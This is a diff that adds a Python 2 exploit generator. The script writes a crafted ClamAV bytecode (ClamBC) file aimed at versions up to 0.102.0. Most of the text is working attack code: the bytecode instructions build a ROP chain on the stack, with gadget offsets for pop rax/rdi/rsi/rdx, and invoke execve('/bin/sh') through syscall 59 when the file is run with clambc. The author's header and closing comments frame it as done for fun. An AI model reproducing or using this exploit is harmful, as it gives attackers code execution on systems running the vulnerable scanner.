@@ -1,0 +1,657 @@
+#!/usr/bin/python
+ 
+'''
+Finished  : 22/07/2019
+Pu8lished : 31/10/2019
+Versi0n   : Current    (<= 0.102.0)
+Result    : Just for fun.
+ 
+"Because of my inability to change the world."
+ 
+In 2002, ClamAV got introducted as a solution for malwares on UNIX-based systems, built on
+a signature-based detection approach, and still undergoes active-development. by that time,
+LibClamAV only held 2 binaries, and expanded to 5 at present.
+ 
+ClamBC were exceptionally more complex and served as a testing tool for bytecodes, majorly
+validating and interpreting the code therein, and the information provided didn't indicate
+nor explain the presence of its internal mechanisms.
+ 
+The availability of the source-code and the lack of documentation led to the establishment
+of this paper, it was certainly not an attempt to escalate privileges, but rather a sought
+-after experience, and source of entertainment that grants the thrill of a challenge.
+ 
+Due to the considerable amount of time spent in the analysis, the dissection of the engine
+was imminent, whilst significantly broadening our perception on its internal structures.
+The trial and error process produced valuable information, crashes illuminated latent bugs,
+effectively increasing the attack surface, and magnifying the possibility for exploitation.
+ 
+> ./exploit.py
+> clambc --debug exploit
+[SNIP]
+$
+'''
+ 
+names = ['test1',
+         'read',
+         'write',
+         'seek',
+         'setvirusname',
+         'debug_print_str',
+         'debug_print_uint',
+         'disasm_x86',
+         'trace_directory',
+         'trace_scope',
+         'trace_source',
+         'trace_op',
+         'trace_value',
+         'trace_ptr',
+         'pe_rawaddr',
+         'file_find',
+         'file_byteat',
+         'malloc',
+         'test2',
+         'get_pe_section',
+         'fill_buffer',
+         'extract_new',
+         'read_number',
+         'hashset_new',
+         'hashset_add',
+         'hashset_remove',
+         'hashset_contains',
+         'hashset_done',
+         'hashset_empty',
+         'buffer_pipe_new',
+         'buffer_pipe_new_fromfile',
+         'buffer_pipe_read_avail',
+         'buffer_pipe_read_get',
+         'buffer_pipe_read_stopped',
+         'buffer_pipe_write_avail',
+         'buffer_pipe_write_get',
+         'buffer_pipe_write_stopped',
+         'buffer_pipe_done',
+         'inflate_init',
+         'inflate_process',
+         'inflate_done',
+         'bytecode_rt_error',
+         'jsnorm_init',
+         'jsnorm_process',
+         'jsnorm_done',
+         'ilog2',
+         'ipow',
+         'iexp',
+         'isin',
+         'icos',
+         'memstr',
+         'hex2ui',
+         'atoi',
+         'debug_print_str_start',
+         'debug_print_str_nonl',
+         'entropy_buffer',
+         'map_new',
+         'map_addkey',
+         'map_setvalue',
+         'map_remove',
+         'map_find',
+         'map_getvaluesize',
+         'map_getvalue',
+         'map_done',
+         'file_find_limit',
+         'engine_functionality_level',
+         'engine_dconf_level',
+         'engine_scan_options',
+         'engine_db_options',
+         'extract_set_container',
+         'input_switch',
+         'get_environment',
+         'disable_bytecode_if',
+         'disable_jit_if',
+         'version_compare',
+         'check_platform',
+         'pdf_get_obj_num',
+         'pdf_get_flags',
+         'pdf_set_flags',
+         'pdf_lookupobj',
+         'pdf_getobjsize',
+         'pdf_getobj',
+         'pdf_getobjid',
+         'pdf_getobjflags',
+         'pdf_setobjflags',
+         'pdf_get_offset',
+         'pdf_get_phase',
+         'pdf_get_dumpedobjid',
+         'matchicon',
+         'running_on_jit',
+         'get_file_reliability',
+         'json_is_active',
+         'json_get_object',
+         'json_get_type',
+         'json_get_array_length',
+         'json_get_array_idx',
+         'json_get_string_length',
+         'json_get_string',
+         'json_get_boolean',
+         'json_get_int']
+o     = names.index('buffer_pipe_new') + 1
+k     = names.index('buffer_pipe_write_get') + 1
+l     = names.index('debug_print_str') + 1
+m     = names.index('malloc') + 1
+ 
+c     = 0
+for name in names:
+    names[c] = name.encode('hex')
+    c += 1
+ 
+def cc(n):
+    v = chr(n + 0x60)
+   
+    return v
+ 
+def cs(s):
+    t = ''
+       
+    for i in xrange(0, len(s), 2):
+        u  = int(s[i], 16)
+        l  = int(s[i + 1], 16)
+        for i in  [u, l]:
+            if((i >= 0 and i <= 0xf)):
+                continue
+            print 'Invalid string.'
+            exit(0)
+       
+        t += cc(l) + cc(u)
+   
+    return t
+   
+def wn(n, fixed=0, size=0):
+    if n is 0:
+        return cc(0)
+ 
+    t  = ''
+    c  = hex(n)[2:]
+    l  = len(c)
+    if (l % 2) is 1:
+        c = "0" + c
+    r  = c[::-1]
+   
+    if(l <= 0x10):
+        if not fixed:
+            t = cc(l)
+        i = 0
+        while i < l:
+            t += cc(int(r[i], 16))
+            i += 1
+    else:
+        print 'Invalid number.'
+        exit(0)
+   
+    if size != 0:
+        t = t.ljust(size, '`')
+       
+    return t
+ 
+def ws(s):
+    t  = '|'
+    e = s[-2:]
+    if(e != '00'):
+        print '[+] Adding null-byte at the end of the string..'
+        s += '00'
+   
+    l  = (len(s) / 2)
+   
+    if (len(s) % 2) is 1:
+        print 'Invalid string length.'
+        exit(0)
+   
+    t += wn(l)
+    t += cs(s)
+   
+    return t
+   
+def wt(t):
+    if t < (num_types + 0x45):
+        v = wn(t)
+        return v
+    else:
+        print 'Invalid type.'
+        exit(0)
+ 
+def initialize_header(minfunc=0, maxfunc=0, num_func=0, linelength=4096):
+    global flimit, num_types
+   
+    if maxfunc is 0:
+        maxfunc = flimit
+   
+    if(minfunc > flimit or  maxfunc < flimit):
+        print 'Invalid minfunc and/or maxfunc.'
+        exit(0)
+   
+    header   = "ClamBC"
+    header  += wn(0x07)                 # formatlevel(6, 7)
+    header  += wn(0x88888888)           # timestamp
+    header  += ws("416c69656e")         # sigmaker
+    header  += wn(0x00)                 # targetExclude
+    header  += wn(0x00)                 # kind
+    header  += wn(minfunc)              # minfunc
+    header  += wn(maxfunc)              # maxfunc
+    header  += wn(0x00)                 # maxresource
+    header  += ws("00")                 # compiler
+    header  += wn(num_types + 5)        # num_types
+    header  += wn(num_func)             # num_func
+    header  += wn(0x53e5493e9f3d1c30)   # magic1
+    header  += wn(0x2a, 1)              # magic2
+    header  += ':'
+    header  += str(linelength)
+    header  += chr(0x0a)*2
+    return header
+ 
+def prepare_types(contained, type=1, nume=1):
+    global num_types
+   
+    types    = "T"
+    types   += wn(0x45, 1)               # start_tid(69)
+   
+    for i in range(0, num_types):
+        types   += wn(type[i], 1)            # kind
+        if type[i] in [1, 2, 3]:
+        # Function, PackedStruct, Struct
+            types += wn(nume[i])             # numElements
+            for j in range(0, nume[i]):
+                types += wt(contained[i][j]) # containedTypes[j]
+        else:
+        # Array, Pointer
+            if type[i] != 5:
+                types += wn(nume[i])         # numElements
+            types += wt(contained[i][0])     # containedTypes[0]
+       
+    types   += chr(0x0a)
+    return types
+   
+def prepare_apis(calls=1):
+    global maxapi, names, ids, tids
+ 
+    if(calls > max_api):
+        print 'Invalid number of calls.'
+        exit(0)
+   
+    apis     = 'E'
+    apis    += wn(max_api)               # maxapi
+    apis    += wn(calls)                 # calls(<= maxapi)
+   
+    for i in range(0, calls):
+        apis += wn(ids[i])               # id
+        apis += wn(tids[i])              # tid
+        apis += ws(names[ids[i] - 1])    # name
+   
+    apis    += chr(0x0a)
+    return apis
+   
+def prepare_globals(numglobals=1):
+    global max_globals, type, gval
+   
+    globals  = 'G'
+    globals += wn(max_globals)           # maxglobals
+    globals += wn(numglobals)            # numglobals
+   
+    for i in range(0, numglobals):
+        globals += wt(type[i])           # type
+        for j in gval[i]:                # subcomponents
+            n        = wn(j)
+            globals += chr(ord(n[0]) - 0x20)
+            globals += n[1:]
+       
+    globals += cc(0)
+    globals += chr(0x0a)
+    return globals
+ 
+def prepare_function_header(numi, numbb, numa=1, numl=0):
+    global allo
+   
+    if numa > 0xf:
+        print 'Invalid number of arguments.'
+        exit(0)
+ 
+    fheader  = 'A'
+    fheader += wn(numa, 1)               # numArgs
+    fheader += wt(0x20)                  # returnType
+    fheader += 'L'
+    fheader += wn(numl)                  # numLocals
+   
+    for i in range(0, numa + numl):
+        fheader += wn(type[i])           # types
+        fheader += wn(allo[i], 1)        # | 0x8000
+       
+    fheader += 'F'
+    fheader += wn(numi)                  # numInsts
+    fheader += wn(numbb)                 # numBB
+    fheader += chr(0x0a)
+    return fheader
+   
+ 
+   
+flimit      = 93
+max_api     = 100
+max_globals = 32773
+ 
+num_types   = 6
+ 
+ 
+# Header parsing
+w    = initialize_header(num_func=0x1)
+# Types parsing
+cont = [[0x8], [0x45], [0x20, 0x20], [0x41, 0x20, 0x20], [0x20, 0x41, 0x20], [0x41, 0x20]]
+type = [0x4, 0x5, 0x1, 0x1, 0x1, 0x1]
+num  = [0x8, 0x1, 0x2, 0x3, 0x3, 0x2]
+w   += prepare_types(cont, type, num)
+# API parsing
+ids  = [o, k, l, m]
+tids = [71, 72, 73, 74]
+w   += prepare_apis(0x4)
+'''
+# crash @ id=0
+'''
+# Globals parsing
+type = [0x45]
+gval = [[0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]]
+w   += prepare_globals(0x1)
+# Function header parsing
+type = [0x45, 0x41, 0x40, 0x40, 0x40, 0x40, 0x20]
+allo = [   1,    0,    0,    0,    0,    0,    0]
+w   += prepare_function_header(35, 0x1, 0x0, 0x7)
+# BB parsing
+p  = 'B'
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x0)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += '@d'
+ 
+# STORE (0x0068732f6e69622f(L=8) -> ([Var #1]))
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += 'Nobbfifnfobcghfh'
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x360)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'C`fcd'
+ 
+# LOAD Var #2 = ([Var #1])
+p += wn(0x40)
+p += wn(0x2)
+p += wn(0x27, 1)
+p += wn(0x1)
+ 
+# SUB Var #2 -= 0xd260
+p += wn(0x40)
+p += wn(0x2)
+p += wn(0x2, 1, 2)
+p += wn(0x2)
+p += 'D`fbmd'
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x10)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'B`ad'
+ 
+# LOAD Var #3 = ([Var #1])
+p += wn(0x40)
+p += wn(0x3)
+p += wn(0x27, 1)
+p += wn(0x1)
+ 
+# SUB Var #3 -= 0x10
+p += wn(0x40)
+p += wn(0x3)
+p += wn(0x2, 1, 2)
+p += wn(0x3)
+p += 'B`ad'
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x30)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'B`cd'
+ 
+# LOAD Var #4 = ([Var #1])
+p += wn(0x40)
+p += wn(0x4)
+p += wn(0x27, 1)
+p += wn(0x1)
+ 
+# SUB Var #4 -= 0x190
+p += wn(0x40)
+p += wn(0x4)
+p += wn(0x2, 1, 2)
+p += wn(0x4)
+p += 'C`iad'
+ 
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x38)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'Bhcd'
+ 
+# STORE (Var #3 -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += wn(0x3)
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x48)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'Bhdd'
+ 
+# ADD Var #3 += 0x3
+p += wn(0x40)
+p += wn(0x3)
+p += wn(0x2, 1, 2)
+p += wn(0x3)
+p += 'Acd'
+ 
+# STORE (Var #3 -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += wn(0x3)
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x28)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'Bhbd'
+ 
+# ADD Var #5 += Var #2 + 0xcbda
+p += wn(0x40)
+p += wn(0x5)
+p += wn(0x1, 1, 2)
+p += wn(0x2)
+p += 'Djmkld'
+ 
+# STORE (Var #5 -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += wn(0x5)
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x20)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'B`bd'
+ 
+# STORE (Var #4 -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += wn(0x4)
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x18)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'Bhad'
+ 
+# ADD Var #5 += Var #2 + 0x99dc
+p += wn(0x40)
+p += wn(0x5)
+p += wn(0x1, 1, 2)
+p += wn(0x2)
+p += 'Dlmiid'
+ 
+# STORE (Var #5 -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += wn(0x5)
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x10)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'B`ad'
+ 
+# STORE (0x3b -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += 'Bkcd'
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x30)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'B`cd'
+ 
+# STORE (0x0 -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += '@d'
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x40)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'B`dd'
+ 
+# STORE (0x0 -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += '@d'
+p += wn(0x1)
+ 
+# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x8)
+p += wn(0x0)
+p += wn(0x1)
+p += wn(0x24, 1)
+p += wn(0x46)
+p += wn(0x0)
+p += 'Ahd'
+ 
+# ADD Var #2 += 0x6d68
+p += wn(0x40)
+p += wn(0x2)
+p += wn(0x1, 1, 2)
+p += wn(0x2)
+p += 'Dhfmfd'
+ 
+# STORE (Var #2 -> Var #1)
+p += wn(0x40)
+p += wn(0x0)
+p += wn(0x26, 1)
+p += wn(0x2)
+p += wn(0x1)
+ 
+'''
+0x99dc : pop rdi ; ret
+0xcbda : pop rsi ; ret
+0x6d68 : pop rax ; ret
+ 
+Var #2 = text_base
+Var #3 = syscall       (+3: pop rdx; ret)
+Var #4 = "/bin/sh\x00"
+ 
+pop rax; ret; o  0x8
+59            o  0x10
+pop rdi; ret; o  0x18
+sh; address   o  0x20
+pop rsi; ret; o  0x28
+0x0           o  0x30
+pop rdx; ret; o  0x38
+0x0           o  0x40
+syscall       o  0x48
+'''
+ 
+# COPY Var #6 = (0x5a90050f(o`e``ije))
+p += wn(0x20)
+p += wn(0x0)
+p += wn(0x22, 1)
+p += 'Ho`e``ijeh'
+p += wn(0x6)
+ 
+p += 'T'
+p += wn(0x13, 1)
+p += wn(0x20)
+p += wn(0x6)
+p += 'E'
+ 
+w += p
+f  = open("exploit", "w")
+f.write(w)
+f.close()
+ 
+print '[+] Generated payload'
+ 
+'''
+Mortals represent immorality, clueless, they crush each other in an everlasting
+pursuit to climb the ladder of social-status, greed is engraved in their nature,
+they're materialistic, and the essence of their lives is money and wealth.
+However, such definition is inaccurate as it doesn't apply to the minority.
+I have discovered a truly marvelous proof of their existence, which this margin
+is too narrow to contain.
+ 
+- Alien599, not Fermat.
+ 
+Greetings to Alien133, Alien610, Alien6068, Alien814, Alien641.
+X
+'''
